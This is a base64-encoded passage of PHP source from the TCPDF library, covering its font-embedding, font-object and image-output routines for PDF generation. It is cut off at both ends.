WZmLiddID4+Jy4iXG4iLidlbmRvYmonKTsKCQl9CgkJZm9yZWFjaCAoJHRoaXMtPkZvbnRGaWxlcyBhcyAkZmlsZSA9PiAkaW5mbykgewoJCQkvLyBzZWFyY2ggYW5kIGdldCBmb250IGZpbGUgdG8gZW1iZWRkCgkJCSRmb250ZmlsZSA9IFRDUERGX0ZPTlRTOjpnZXRGb250RnVsbFBhdGgoJGZpbGUsICRpbmZvWydmb250ZGlyJ10pOwoJCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRmb250ZmlsZSkpIHsKCQkJCSRmb250ID0gZmlsZV9nZXRfY29udGVudHMoJGZvbnRmaWxlKTsKCQkJCSRjb21wcmVzc2VkID0gKHN1YnN0cigkZmlsZSwgLTIpID09ICcueicpOwoJCQkJaWYgKCghJGNvbXByZXNzZWQpIEFORCAoaXNzZXQoJGluZm9bJ2xlbmd0aDInXSkpKSB7CgkJCQkJJGhlYWRlciA9IChvcmQoJGZvbnRbMF0pID09IDEyOCk7CgkJCQkJaWYgKCRoZWFkZXIpIHsKCQkJCQkJLy8gc3RyaXAgZmlyc3QgYmluYXJ5IGhlYWRlcgoJCQkJCQkkZm9udCA9IHN1YnN0cigkZm9udCwgNik7CgkJCQkJfQoJCQkJCWlmICgkaGVhZGVyIEFORCAob3JkKCRmb250WyRpbmZvWydsZW5ndGgxJ11dKSA9PSAxMjgpKSB7CgkJCQkJCS8vIHN0cmlwIHNlY29uZCBiaW5hcnkgaGVhZGVyCgkJCQkJCSRmb250ID0gc3Vic3RyKCRmb250LCAwLCAkaW5mb1snbGVuZ3RoMSddKS5zdWJzdHIoJGZvbnQsICgkaW5mb1snbGVuZ3RoMSddICsgNikpOwoJCQkJCX0KCQkJCX0gZWxzZWlmICgkaW5mb1snc3Vic2V0J10gQU5EICgoISRjb21wcmVzc2VkKSBPUiAoJGNvbXByZXNzZWQgQU5EIGZ1bmN0aW9uX2V4aXN0cygnZ3pjb21wcmVzcycpKSkpIHsKCQkJCQlpZiAoJGNvbXByZXNzZWQpIHsKCQkJCQkJLy8gdW5jb21wcmVzcyBmb250CgkJCQkJCSRmb250ID0gZ3p1bmNvbXByZXNzKCRmb250KTsKCQkJCQl9CgkJCQkJLy8gbWVyZ2Ugc3Vic2V0IGNoYXJhY3RlcnMKCQkJCQkkc3Vic2V0Y2hhcnMgPSBhcnJheSgpOyAvLyB1c2VkIGNoYXJzCgkJCQkJZm9yZWFjaCAoJGluZm9bJ2ZvbnRrZXlzJ10gYXMgJGZvbnRrZXkpIHsKCQkJCQkJJGZvbnRpbmZvID0gJHRoaXMtPmdldEZvbnRCdWZmZXIoJGZvbnRrZXkpOwoJCQkJCQkkc3Vic2V0Y2hhcnMgKz0gJGZvbnRpbmZvWydzdWJzZXRjaGFycyddOwoJCQkJCX0KCQkJCQkvLyByZWJ1aWxkIGEgZm9udCBzdWJzZXQKCQkJCQkkZm9udCA9IFRDUERGX0ZPTlRTOjpfZ2V0VHJ1ZVR5cGVGb250U3Vic2V0KCRmb250LCAkc3Vic2V0Y2hhcnMpOwoJCQkJCS8vIGNhbGN1bGF0ZSBuZXcgZm9udCBsZW5ndGgKCQkJCQkkaW5mb1snbGVuZ3RoMSddID0gc3RybGVuKCRmb250KTsKCQkJCQlpZiAoJGNvbXByZXNzZWQpIHsKCQkJCQkJLy8gcmVjb21wcmVzcyBmb250CgkJCQkJCSRmb250ID0gZ3pjb21wcmVzcygkZm9udCk7CgkJCQkJfQoJCQkJfQoJCQkJJHRoaXMtPl9uZXdvYmooKTsKCQkJCSR0aGlzLT5Gb250RmlsZXNbJGZpbGVdWyduJ10gPSAkdGhpcy0+bjsKCQkJCSRzdHJlYW0gPSAkdGhpcy0+X2dldHJhd3N0cmVhbSgkZm9udCk7CgkJCQkkb3V0ID0gJzw8IC9MZW5ndGggJy5zdHJsZW4oJHN0cmVhbSk7CgkJCQlpZiAoJGNvbXByZXNzZWQpIHsKCQkJCQkkb3V0IC49ICcgL0ZpbHRlciAvRmxhdGVEZWNvZGUnOwoJCQkJfQoJCQkJJG91dCAuPSAnIC9MZW5ndGgxICcuJGluZm9bJ2xlbmd0aDEnXTsKCQkJCWlmIChpc3NldCgkaW5mb1snbGVuZ3RoMiddKSkgewoJCQkJCSRvdXQgLj0gJyAvTGVuZ3RoMiAnLiRpbmZvWydsZW5ndGgyJ10uJyAvTGVuZ3RoMyAwJzsKCQkJCX0KCQkJCSRvdXQgLj0gJyA+Pic7CgkJCQkkb3V0IC49ICcgc3RyZWFtJy4iXG4iLiRzdHJlYW0uIlxuIi4nZW5kc3RyZWFtJzsKCQkJCSRvdXQgLj0gIlxuIi4nZW5kb2JqJzsKCQkJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCQl9CgkJfQoJCWZvcmVhY2ggKCR0aGlzLT5mb250a2V5cyBhcyAkaykgewoJCQkvL0ZvbnQgb2JqZWN0cwoJCQkkZm9udCA9ICR0aGlzLT5nZXRGb250QnVmZmVyKCRrKTsKCQkJJHR5cGUgPSAkZm9udFsndHlwZSddOwoJCQkkbmFtZSA9ICRmb250WyduYW1lJ107CgkJCWlmICgkdHlwZSA9PSAnY29yZScpIHsKCQkJCS8vIHN0YW5kYXJkIGNvcmUgZm9udAoJCQkJJG91dCA9ICR0aGlzLT5fZ2V0b2JqKCR0aGlzLT5mb250X29ial9pZHNbJGtdKS4iXG4iOwoJCQkJJG91dCAuPSAnPDwvVHlwZSAvRm9udCc7CgkJCQkkb3V0IC49ICcgL1N1YnR5cGUgL1R5cGUxJzsKCQkJCSRvdXQgLj0gJyAvQmFzZUZvbnQgLycuJG5hbWU7CgkJCQkkb3V0IC49ICcgL05hbWUgL0YnLiRmb250WydpJ107CgkJCQlpZiAoKHN0cnRvbG93ZXIoJG5hbWUpICE9ICdzeW1ib2wnKSBBTkQgKHN0cnRvbG93ZXIoJG5hbWUpICE9ICd6YXBmZGluZ2JhdHMnKSkgewoJCQkJCSRvdXQgLj0gJyAvRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZyc7CgkJCQl9CgkJCQlpZiAoJGsgPT0gJ2hlbHZldGljYScpIHsKCQkJCQkvLyBhZGQgZGVmYXVsdCBmb250IGZvciBhbm5vdGF0aW9ucwoJCQkJCSR0aGlzLT5hbm5vdGF0aW9uX2ZvbnRzWyRrXSA9ICRmb250WydpJ107CgkJCQl9CgkJCQkkb3V0IC49ICcgPj4nOwoJCQkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCQkJJHRoaXMtPl9vdXQoJG91dCk7CgkJCX0gZWxzZWlmICgoJHR5cGUgPT0gJ1R5cGUxJykgT1IgKCR0eXBlID09ICdUcnVlVHlwZScpKSB7CgkJCQkvLyBhZGRpdGlvbmFsIFR5cGUxIG9yIFRydWVUeXBlIGZvbnQKCQkJCSRvdXQgPSAkdGhpcy0+X2dldG9iaigkdGhpcy0+Zm9udF9vYmpfaWRzWyRrXSkuIlxuIjsKCQkJCSRvdXQgLj0gJzw8L1R5cGUgL0ZvbnQnOwoJCQkJJG91dCAuPSAnIC9TdWJ0eXBlIC8nLiR0eXBlOwoJCQkJJG91dCAuPSAnIC9CYXNlRm9udCAvJy4kbmFtZTsKCQkJCSRvdXQgLj0gJyAvTmFtZSAvRicuJGZvbnRbJ2knXTsKCQkJCSRvdXQgLj0gJyAvRmlyc3RDaGFyIDMyIC9MYXN0Q2hhciAyNTUnOwoJCQkJJG91dCAuPSAnIC9XaWR0aHMgJy4oJHRoaXMtPm4gKyAxKS4nIDAgUic7CgkJCQkkb3V0IC49ICcgL0ZvbnREZXNjcmlwdG9yICcuKCR0aGlzLT5uICsgMikuJyAwIFInOwoJCQkJaWYgKCRmb250WydlbmMnXSkgewoJCQkJCWlmIChpc3NldCgkZm9udFsnZGlmZiddKSkgewoJCQkJCQkkb3V0IC49ICcgL0VuY29kaW5nICcuKCRuZiArICRmb250WydkaWZmJ10pLicgMCBSJzsKCQkJCQl9IGVsc2UgewoJCQkJCQkkb3V0IC49ICcgL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcnOwoJCQkJCX0KCQkJCX0KCQkJCSRvdXQgLj0gJyA+Pic7CgkJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCQkkdGhpcy0+X291dCgkb3V0KTsKCQkJCS8vIFdpZHRocwoJCQkJJHRoaXMtPl9uZXdvYmooKTsKCQkJCSRzID0gJ1snOwoJCQkJZm9yICgkaSA9IDMyOyAkaSA8IDI1NjsgKyskaSkgewoJCQkJCWlmIChpc3NldCgkZm9udFsnY3cnXVskaV0pKSB7CgkJCQkJCSRzIC49ICRmb250WydjdyddWyRpXS4nICc7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHMgLj0gJGZvbnRbJ2R3J10uJyAnOwoJCQkJCX0KCQkJCX0KCQkJCSRzIC49ICddJzsKCQkJCSRzIC49ICJcbiIuJ2VuZG9iaic7CgkJCQkkdGhpcy0+X291dCgkcyk7CgkJCQkvL0Rlc2NyaXB0b3IKCQkJCSR0aGlzLT5fbmV3b2JqKCk7CgkJCQkkcyA9ICc8PC9UeXBlIC9Gb250RGVzY3JpcHRvciAvRm9udE5hbWUgLycuJG5hbWU7CgkJCQlmb3JlYWNoICgkZm9udFsnZGVzYyddIGFzICRmZGsgPT4gJGZkdikgewoJCQkJCWlmIChpc19mbG9hdCgkZmR2KSkgewoJCQkJCQkkZmR2ID0gc3ByaW50ZignJUYnLCAkZmR2KTsKCQkJCQl9CgkJCQkJJHMgLj0gJyAvJy4kZmRrLicgJy4kZmR2LicnOwoJCQkJfQoJCQkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZm9udFsnZmlsZSddKSkgewoJCQkJCSRzIC49ICcgL0ZvbnRGaWxlJy4oJHR5cGUgPT0gJ1R5cGUxJyA/ICcnIDogJzInKS4nICcuJHRoaXMtPkZvbnRGaWxlc1skZm9udFsnZmlsZSddXVsnbiddLicgMCBSJzsKCQkJCX0KCQkJCSRzIC49ICc+Pic7CgkJCQkkcyAuPSAiXG4iLidlbmRvYmonOwoJCQkJJHRoaXMtPl9vdXQoJHMpOwoJCQl9IGVsc2UgewoJCQkJLy8gYWRkaXRpb25hbCB0eXBlcwoJCQkJJG10ZCA9ICdfcHV0Jy5zdHJ0b2xvd2VyKCR0eXBlKTsKCQkJCWlmICghbWV0aG9kX2V4aXN0cygkdGhpcywgJG10ZCkpIHsKCQkJCQkkdGhpcy0+RXJyb3IoJ1Vuc3VwcG9ydGVkIGZvbnQgdHlwZTogJy4kdHlwZSk7CgkJCQl9CgkJCQkkdGhpcy0+JG10ZCgkZm9udCk7CgkJCX0KCQl9Cgl9CgoJLyoqCgkgKiBBZGRzIHVuaWNvZGUgZm9udHMuPGJyPgoJICogQmFzZWQgb24gUERGIFJlZmVyZW5jZSAxLjMgKHNlY3Rpb24gNSkKCSAqIEBwYXJhbSBhcnJheSAkZm9udCBmb250IGRhdGEKCSAqIEBwcm90ZWN0ZWQKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgMS41Mi4wLlRDMDA1ICgyMDA1LTAxLTA1KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX3B1dHRydWV0eXBldW5pY29kZSgkZm9udCkgewoJCSRmb250bmFtZSA9ICcnOwoJCWlmICgkZm9udFsnc3Vic2V0J10pIHsKCQkJLy8gY2hhbmdlIG5hbWUgZm9yIGZvbnQgc3Vic2V0dGluZwoJCQkkc3VidGFnID0gc3ByaW50ZignJTA2dScsICRmb250WydpJ10pOwoJCQkkc3VidGFnID0gc3RydHIoJHN1YnRhZywgJzAxMjM0NTY3ODknLCAnQUJDREVGR0hJSicpOwoJCQkkZm9udG5hbWUgLj0gJHN1YnRhZy4nKyc7CgkJfQoJCSRmb250bmFtZSAuPSAkZm9udFsnbmFtZSddOwoJCS8vIFR5cGUwIEZvbnQKCQkvLyBBIGNvbXBvc2l0ZSBmb250IGNvbXBvc2VkIG9mIG90aGVyIGZvbnRzLCBvcmdhbml6ZWQgaGllcmFyY2hpY2FsbHkKCQkkb3V0ID0gJHRoaXMtPl9nZXRvYmooJHRoaXMtPmZvbnRfb2JqX2lkc1skZm9udFsnZm9udGtleSddXSkuIlxuIjsKCQkkb3V0IC49ICc8PCAvVHlwZSAvRm9udCc7CgkJJG91dCAuPSAnIC9TdWJ0eXBlIC9UeXBlMCc7CgkJJG91dCAuPSAnIC9CYXNlRm9udCAvJy4kZm9udG5hbWU7CgkJJG91dCAuPSAnIC9OYW1lIC9GJy4kZm9udFsnaSddOwoJCSRvdXQgLj0gJyAvRW5jb2RpbmcgLycuJGZvbnRbJ2VuYyddOwoJCSRvdXQgLj0gJyAvVG9Vbmljb2RlICcuKCR0aGlzLT5uICsgMSkuJyAwIFInOwoJCSRvdXQgLj0gJyAvRGVzY2VuZGFudEZvbnRzIFsnLigkdGhpcy0+biArIDIpLicgMCBSXSc7CgkJJG91dCAuPSAnID4+JzsKCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJJHRoaXMtPl9vdXQoJG91dCk7CgkJLy8gVG9Vbmljb2RlIG1hcCBmb3IgSWRlbnRpdHktSAoJCSRzdHJlYW0gPSBUQ1BERl9GT05UX0RBVEE6OiR1bmlfaWRlbnRpdHlfaDsKCQkvLyBUb1VuaWNvZGUgT2JqZWN0CgkJJHRoaXMtPl9uZXdvYmooKTsKCQkkc3RyZWFtID0gKCR0aGlzLT5jb21wcmVzcykgPyBnemNvbXByZXNzKCRzdHJlYW0pIDogJHN0cmVhbTsKCQkkZmlsdGVyID0gKCR0aGlzLT5jb21wcmVzcykgPyAnL0ZpbHRlciAvRmxhdGVEZWNvZGUgJyA6ICcnOwoJCSRzdHJlYW0gPSAkdGhpcy0+X2dldHJhd3N0cmVhbSgkc3RyZWFtKTsKCQkkdGhpcy0+X291dCgnPDwnLiRmaWx0ZXIuJy9MZW5ndGggJy5zdHJsZW4oJHN0cmVhbSkuJz4+IHN0cmVhbScuIlxuIi4kc3RyZWFtLiJcbiIuJ2VuZHN0cmVhbScuIlxuIi4nZW5kb2JqJyk7CgkJLy8gQ0lERm9udFR5cGUyCgkJLy8gQSBDSURGb250IHdob3NlIGdseXBoIGRlc2NyaXB0aW9ucyBhcmUgYmFzZWQgb24gVHJ1ZVR5cGUgZm9udCB0ZWNobm9sb2d5CgkJJG9pZCA9ICR0aGlzLT5fbmV3b2JqKCk7CgkJJG91dCA9ICc8PCAvVHlwZSAvRm9udCc7CgkJJG91dCAuPSAnIC9TdWJ0eXBlIC9DSURGb250VHlwZTInOwoJCSRvdXQgLj0gJyAvQmFzZUZvbnQgLycuJGZvbnRuYW1lOwoJCS8vIEEgZGljdGlvbmFyeSBjb250YWluaW5nIGVudHJpZXMgdGhhdCBkZWZpbmUgdGhlIGNoYXJhY3RlciBjb2xsZWN0aW9uIG9mIHRoZSBDSURGb250LgoJCSRjaWRpbmZvID0gJy9SZWdpc3RyeSAnLiR0aGlzLT5fZGF0YXN0cmluZygkZm9udFsnY2lkaW5mbyddWydSZWdpc3RyeSddLCAkb2lkKTsKCQkkY2lkaW5mbyAuPSAnIC9PcmRlcmluZyAnLiR0aGlzLT5fZGF0YXN0cmluZygkZm9udFsnY2lkaW5mbyddWydPcmRlcmluZyddLCAkb2lkKTsKCQkkY2lkaW5mbyAuPSAnIC9TdXBwbGVtZW50ICcuJGZvbnRbJ2NpZGluZm8nXVsnU3VwcGxlbWVudCddOwoJCSRvdXQgLj0gJyAvQ0lEU3lzdGVtSW5mbyA8PCAnLiRjaWRpbmZvLicgPj4nOwoJCSRvdXQgLj0gJyAvRm9udERlc2NyaXB0b3IgJy4oJHRoaXMtPm4gKyAxKS4nIDAgUic7CgkJJG91dCAuPSAnIC9EVyAnLiRmb250WydkdyddOyAvLyBkZWZhdWx0IHdpZHRoCgkJJG91dCAuPSAiXG4iLlRDUERGX0ZPTlRTOjpfcHV0Zm9udHdpZHRocygkZm9udCwgMCk7CgkJaWYgKGlzc2V0KCRmb250WydjdGcnXSkgQU5EICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGZvbnRbJ2N0ZyddKSkpIHsKCQkJJG91dCAuPSAiXG4iLicvQ0lEVG9HSURNYXAgJy4oJHRoaXMtPm4gKyAyKS4nIDAgUic7CgkJfQoJCSRvdXQgLj0gJyA+Pic7CgkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCS8vIEZvbnQgZGVzY3JpcHRvcgoJCS8vIEEgZm9udCBkZXNjcmlwdG9yIGRlc2NyaWJpbmcgdGhlIENJREZvbnQgZGVmYXVsdCBtZXRyaWNzIG90aGVyIHRoYW4gaXRzIGdseXBoIHdpZHRocwoJCSR0aGlzLT5fbmV3b2JqKCk7CgkJJG91dCA9ICc8PCAvVHlwZSAvRm9udERlc2NyaXB0b3InOwoJCSRvdXQgLj0gJyAvRm9udE5hbWUgLycuJGZvbnRuYW1lOwoJCWZvcmVhY2ggKCRmb250WydkZXNjJ10gYXMgJGtleSA9PiAkdmFsdWUpIHsKCQkJaWYgKGlzX2Zsb2F0KCR2YWx1ZSkpIHsKCQkJCSR2YWx1ZSA9IHNwcmludGYoJyVGJywgJHZhbHVlKTsKCQkJfQoJCQkkb3V0IC49ICcgLycuJGtleS4nICcuJHZhbHVlOwoJCX0KCQkkZm9udGRpciA9IGZhbHNlOwoJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGZvbnRbJ2ZpbGUnXSkpIHsKCQkJLy8gQSBzdHJlYW0gY29udGFpbmluZyBhIFRydWVUeXBlIGZvbnQKCQkJJG91dCAuPSAnIC9Gb250RmlsZTIgJy4kdGhpcy0+Rm9udEZpbGVzWyRmb250WydmaWxlJ11dWyduJ10uJyAwIFInOwoJCQkkZm9udGRpciA9ICR0aGlzLT5Gb250RmlsZXNbJGZvbnRbJ2ZpbGUnXV1bJ2ZvbnRkaXInXTsKCQl9CgkJJG91dCAuPSAnID4+JzsKCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJJHRoaXMtPl9vdXQoJG91dCk7CgkJaWYgKGlzc2V0KCRmb250WydjdGcnXSkgQU5EICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGZvbnRbJ2N0ZyddKSkpIHsKCQkJJHRoaXMtPl9uZXdvYmooKTsKCQkJLy8gRW1iZWQgQ0lEVG9HSURNYXAKCQkJLy8gQSBzcGVjaWZpY2F0aW9uIG9mIHRoZSBtYXBwaW5nIGZyb20gQ0lEcyB0byBnbHlwaCBpbmRpY2VzCgkJCS8vIHNlYXJjaCBhbmQgZ2V0IENURyBmb250IGZpbGUgdG8gZW1iZWRkCgkJCSRjdGdmaWxlID0gc3RydG9sb3dlcigkZm9udFsnY3RnJ10pOwoJCQkvLyBzZWFyY2ggYW5kIGdldCBjdGcgZm9udCBmaWxlIHRvIGVtYmVkZAoJCQkkZm9udGZpbGUgPSBUQ1BERl9GT05UUzo6Z2V0Rm9udEZ1bGxQYXRoKCRjdGdmaWxlLCAkZm9udGRpcik7CgkJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZm9udGZpbGUpKSB7CgkJCQkkdGhpcy0+RXJyb3IoJ0ZvbnQgZmlsZSBub3QgZm91bmQ6ICcuJGN0Z2ZpbGUpOwoJCQl9CgkJCSRzdHJlYW0gPSAkdGhpcy0+X2dldHJhd3N0cmVhbShmaWxlX2dldF9jb250ZW50cygkZm9udGZpbGUpKTsKCQkJJG91dCA9ICc8PCAvTGVuZ3RoICcuc3RybGVuKCRzdHJlYW0pLicnOwoJCQlpZiAoc3Vic3RyKCRmb250ZmlsZSwgLTIpID09ICcueicpIHsgLy8gY2hlY2sgZmlsZSBleHRlbnNpb24KCQkJCS8vIERlY29tcHJlc3NlcyBkYXRhIGVuY29kZWQgdXNpbmcgdGhlIHB1YmxpYy1kb21haW4KCQkJCS8vIHpsaWIvZGVmbGF0ZSBjb21wcmVzc2lvbiBtZXRob2QsIHJlcHJvZHVjaW5nIHRoZQoJCQkJLy8gb3JpZ2luYWwgdGV4dCBvciBiaW5hcnkgZGF0YQoJCQkJJG91dCAuPSAnIC9GaWx0ZXIgL0ZsYXRlRGVjb2RlJzsKCQkJfQoJCQkkb3V0IC49ICcgPj4nOwoJCQkkb3V0IC49ICcgc3RyZWFtJy4iXG4iLiRzdHJlYW0uIlxuIi4nZW5kc3RyZWFtJzsKCQkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCQkkdGhpcy0+X291dCgkb3V0KTsKCQl9Cgl9CgoJLyoqCgkgKiBPdXRwdXQgQ0lELTAgZm9udHMuCgkgKiBBIFR5cGUgMCBDSURGb250IGNvbnRhaW5zIGdseXBoIGRlc2NyaXB0aW9ucyBiYXNlZCBvbiB0aGUgQWRvYmUgVHlwZSAxIGZvbnQgZm9ybWF0CgkgKiBAcGFyYW0gYXJyYXkgJGZvbnQgZm9udCBkYXRhCgkgKiBAcHJvdGVjdGVkCgkgKiBAYXV0aG9yIEFuZHJldyBXaGl0ZWhlYWQsIE5pY29sYSBBc3VuaSwgWXVraWhpcm8gTmFrYWRhaXJhCgkgKiBAc2luY2UgMy4yLjAwMCAoMjAwOC0wNi0yMykKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9wdXRjaWRmb250MCgkZm9udCkgewoJCSRjaWRvZmZzZXQgPSAwOwoJCWlmICghaXNzZXQoJGZvbnRbJ2N3J11bMV0pKSB7CgkJCSRjaWRvZmZzZXQgPSAzMTsKCQl9CgkJaWYgKGlzc2V0KCRmb250WydjaWRpbmZvJ11bJ3VuaTJjaWQnXSkpIHsKCQkJLy8gY29udmVydCB1bmljb2RlIHRvIGNpZC4KCQkJJHVuaTJjaWQgPSAkZm9udFsnY2lkaW5mbyddWyd1bmkyY2lkJ107CgkJCSRjdyA9IGFycmF5KCk7CgkJCWZvcmVhY2ggKCRmb250WydjdyddIGFzICR1bmkgPT4gJHdpZHRoKSB7CgkJCQlpZiAoaXNzZXQoJHVuaTJjaWRbJHVuaV0pKSB7CgkJCQkJJGN3WygkdW5pMmNpZFskdW5pXSArICRjaWRvZmZzZXQpXSA9ICR3aWR0aDsKCQkJCX0gZWxzZWlmICgkdW5pIDwgMjU2KSB7CgkJCQkJJGN3WyR1bmldID0gJHdpZHRoOwoJCQkJfSAvLyBlbHNlIHVua25vd24gY2hhcmFjdGVyCgkJCX0KCQkJJGZvbnQgPSBhcnJheV9tZXJnZSgkZm9udCwgYXJyYXkoJ2N3JyA9PiAkY3cpKTsKCQl9CgkJJG5hbWUgPSAkZm9udFsnbmFtZSddOwoJCSRlbmMgPSAkZm9udFsnZW5jJ107CgkJaWYgKCRlbmMpIHsKCQkJJGxvbmduYW1lID0gJG5hbWUuJy0nLiRlbmM7CgkJfSBlbHNlIHsKCQkJJGxvbmduYW1lID0gJG5hbWU7CgkJfQoJCSRvdXQgPSAkdGhpcy0+X2dldG9iaigkdGhpcy0+Zm9udF9vYmpfaWRzWyRmb250Wydmb250a2V5J11dKS4iXG4iOwoJCSRvdXQgLj0gJzw8L1R5cGUgL0ZvbnQnOwoJCSRvdXQgLj0gJyAvU3VidHlwZSAvVHlwZTAnOwoJCSRvdXQgLj0gJyAvQmFzZUZvbnQgLycuJGxvbmduYW1lOwoJCSRvdXQgLj0gJyAvTmFtZSAvRicuJGZvbnRbJ2knXTsKCQlpZiAoJGVuYykgewoJCQkkb3V0IC49ICcgL0VuY29kaW5nIC8nLiRlbmM7CgkJfQoJCSRvdXQgLj0gJyAvRGVzY2VuZGFudEZvbnRzIFsnLigkdGhpcy0+biArIDEpLicgMCBSXSc7CgkJJG91dCAuPSAnID4+JzsKCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJJHRoaXMtPl9vdXQoJG91dCk7CgkJJG9pZCA9ICR0aGlzLT5fbmV3b2JqKCk7CgkJJG91dCA9ICc8PC9UeXBlIC9Gb250JzsKCQkkb3V0IC49ICcgL1N1YnR5cGUgL0NJREZvbnRUeXBlMCc7CgkJJG91dCAuPSAnIC9CYXNlRm9udCAvJy4kbmFtZTsKCQkkY2lkaW5mbyA9ICcvUmVnaXN0cnkgJy4kdGhpcy0+X2RhdGFzdHJpbmcoJGZvbnRbJ2NpZGluZm8nXVsnUmVnaXN0cnknXSwgJG9pZCk7CgkJJGNpZGluZm8gLj0gJyAvT3JkZXJpbmcgJy4kdGhpcy0+X2RhdGFzdHJpbmcoJGZvbnRbJ2NpZGluZm8nXVsnT3JkZXJpbmcnXSwgJG9pZCk7CgkJJGNpZGluZm8gLj0gJyAvU3VwcGxlbWVudCAnLiRmb250WydjaWRpbmZvJ11bJ1N1cHBsZW1lbnQnXTsKCQkkb3V0IC49ICcgL0NJRFN5c3RlbUluZm8gPDwnLiRjaWRpbmZvLic+Pic7CgkJJG91dCAuPSAnIC9Gb250RGVzY3JpcHRvciAnLigkdGhpcy0+biArIDEpLicgMCBSJzsKCQkkb3V0IC49ICcgL0RXICcuJGZvbnRbJ2R3J107CgkJJG91dCAuPSAiXG4iLlRDUERGX0ZPTlRTOjpfcHV0Zm9udHdpZHRocygkZm9udCwgJGNpZG9mZnNldCk7CgkJJG91dCAuPSAnID4+JzsKCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJJHRoaXMtPl9vdXQoJG91dCk7CgkJJHRoaXMtPl9uZXdvYmooKTsKCQkkcyA9ICc8PC9UeXBlIC9Gb250RGVzY3JpcHRvciAvRm9udE5hbWUgLycuJG5hbWU7CgkJZm9yZWFjaCAoJGZvbnRbJ2Rlc2MnXSBhcyAkayA9PiAkdikgewoJCQlpZiAoJGsgIT0gJ1N0eWxlJykgewoJCQkJaWYgKGlzX2Zsb2F0KCR2KSkgewoJCQkJCSR2ID0gc3ByaW50ZignJUYnLCAkdik7CgkJCQl9CgkJCQkkcyAuPSAnIC8nLiRrLicgJy4kdi4nJzsKCQkJfQoJCX0KCQkkcyAuPSAnPj4nOwoJCSRzIC49ICJcbiIuJ2VuZG9iaic7CgkJJHRoaXMtPl9vdXQoJHMpOwoJfQoKCS8qKgoJICogT3V0cHV0IGltYWdlcy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9wdXRpbWFnZXMoKSB7CgkJJGZpbHRlciA9ICgkdGhpcy0+Y29tcHJlc3MpID8gJy9GaWx0ZXIgL0ZsYXRlRGVjb2RlICcgOiAnJzsKCQlmb3JlYWNoICgkdGhpcy0+aW1hZ2VrZXlzIGFzICRmaWxlKSB7CgkJCSRpbmZvID0gJHRoaXMtPmdldEltYWdlQnVmZmVyKCRmaWxlKTsKCQkJLy8gc2V0IG9iamVjdCBmb3IgYWx0ZXJuYXRlIGltYWdlcyBhcnJheQoJCQkkYWx0b2lkID0gbnVsbDsKCQkJaWYgKCghJHRoaXMtPnBkZmFfbW9kZSkgQU5EIGlzc2V0KCRpbmZvWydhbHRpbWdzJ10pIEFORCAhZW1wdHkoJGluZm9bJ2FsdGltZ3MnXSkpIHsKCQkJCSRhbHRvaWQgPSAkdGhpcy0+X25ld29iaigpOwoJCQkJJG91dCA9ICdbJzsKCQkJCWZvcmVhY2ggKCRpbmZvWydhbHRpbWdzJ10gYXMgJGFsdGltYWdlKSB7CgkJCQkJaWYgKGlzc2V0KCR0aGlzLT54b2JqZWN0c1snSScuJGFsdGltYWdlWzBdXVsnbiddKSkgewoJCQkJCQkkb3V0IC49ICcgPDwgL0ltYWdlICcuJHRoaXMtPnhvYmplY3RzWydJJy4kYWx0aW1hZ2VbMF1dWyduJ10uJyAwIFInOwoJCQkJCQkkb3V0IC49ICcgL0RlZmF1bHRGb3JQcmludGluZyc7CgkJCQkJCWlmICgkYWx0aW1hZ2VbMV0gPT09IHRydWUpIHsKCQkJCQkJCSRvdXQgLj0gJyB0cnVlJzsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRvdXQgLj0gJyBmYWxzZSc7CgkJCQkJCX0KCQkJCQkJJG91dCAuPSAnID4+JzsKCQkJCQl9CgkJCQl9CgkJCQkkb3V0IC49ICcgXSc7CgkJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCQkkdGhpcy0+X291dCgkb3V0KTsKCQkJfQoJCQkvLyBzZXQgaW1hZ2Ugb2JqZWN0CgkJCSRvaWQgPSAkdGhpcy0+X25ld29iaigpOwoJCQkkdGhpcy0+eG9iamVjdHNbJ0knLiRpbmZvWydpJ11dID0gYXJyYXkoJ24nID0+ICRvaWQpOwoJCQkkdGhpcy0+c2V0SW1hZ2VTdWJCdWZmZXIoJGZpbGUsICduJywgJHRoaXMtPm4pOwoJCQkkb3V0ID0gJzw8L1R5cGUgL1hPYmplY3QnOwoJCQkkb3V0IC49ICcgL1N1YnR5cGUgL0ltYWdlJzsKCQkJJG91dCAuPSAnIC9XaWR0aCAnLiRpbmZvWyd3J107CgkJCSRvdXQgLj0gJyAvSGVpZ2h0ICcuJGluZm9bJ2gnXTsKCQkJaWYgKGFycmF5X2tleV9leGlzdHMoJ21hc2tlZCcsICRpbmZvKSkgewoJCQkJJG91dCAuPSAnIC9TTWFzayAnLigkdGhpcy0+biAtIDEpLicgMCBSJzsKCQkJfQoJCQkvLyBzZXQgY29sb3Igc3BhY2UKCQkJJGljYyA9IGZhbHNlOwoJCQlpZiAoaXNzZXQoJGluZm9bJ2ljYyddKSBBTkQgKCRpbmZvWydpY2MnXSAhPT0gZmFsc2UpKSB7CgkJCQkvLyBJQ0MgQ29sb3VyIFNwYWNlCgkJCQkkaWNjID0gdH